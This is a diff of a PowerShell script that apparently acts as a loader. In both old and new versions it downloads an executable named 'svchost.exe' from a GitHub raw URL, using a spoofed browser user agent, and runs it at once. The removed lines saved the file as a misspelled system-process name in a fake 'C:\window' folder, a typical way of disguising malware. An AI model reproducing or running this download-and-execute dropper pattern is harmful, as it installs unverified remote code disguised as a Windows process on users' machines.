@@ -125,33 +125,32 @@ while ($true)
 
         Write-Console "DOWNLOADING..." "INFO"
 
-        $url  = "https://raw.githubusercontent.com/draft7973-ops/JETT.EXE/refs/heads/main/svchost.exe"
-        $path = "C:\window\scvhost.exe"
+$url  = "https://raw.githubusercontent.com/draft7973-ops/JETT.EXE/refs/heads/main/svchost.exe"
+$path = "D:\JETT.exe"
 
-        try {
+try {
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
-            Invoke-WebRequest `
-            -Uri $url `
-            -OutFile $path `
-            -UseBasicParsing `
-            -UserAgent "Mozilla/5.0"
+    Invoke-WebRequest `
+    -Uri $url `
+    -OutFile $path `
+    -UseBasicParsing `
+    -UserAgent "Mozilla/5.0" `
+    -ErrorAction Stop
 
-            if (Test-Path $path)
-            {
-                Write-Host ""
-
-                Write-Console "INSTALL SUCCESS" "SUCCESS"
-
-                Start-Sleep 1
-
-                Start-Process $path
-            }
-            else
-            {
-                Write-Host ""
-
-                Write-Console "INSTALL FAILED" "NO KEY"
-            }
+    if (Test-Path $path) {
+        Write-Console "INSTALL SUCCESS" "SUCCESS"
+        Start-Process $path
+    }
+    else {
+        Write-Console "INSTALL FAILED: FILE NOT FOUND" "NO KEY"
+    }
+}
+catch {
+    Write-Host ""
+    Write-Host $_.Exception.Message -ForegroundColor Red
+    Write-Console "INSTALL FAILED" "NO KEY"
+}
         }
         catch {
 
